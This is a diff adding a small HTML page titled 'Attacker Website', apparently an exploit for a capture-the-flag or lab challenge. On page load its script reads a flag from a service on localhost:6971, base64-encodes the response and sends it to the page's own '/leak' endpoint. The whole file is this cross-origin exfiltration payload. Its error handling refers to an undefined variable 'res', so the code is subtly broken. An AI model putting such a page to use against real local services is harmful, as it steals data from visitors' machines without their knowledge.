@@ -1,0 +1,20 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <title>Attacker Website</title>
+    </head>
+    <body>
+        <script>
+            fetch("http://localhost:6971/flag")
+            .then((r) => {
+                if (!r.ok) throw new Error(`HTTP ${res.status}`);
+                return r.json();
+            }).then((data) => {
+                const json = JSON.stringify(data);
+                fetch("/leak?data=" + btoa(json))
+            });
+        </script>
+    </body>
+</html>
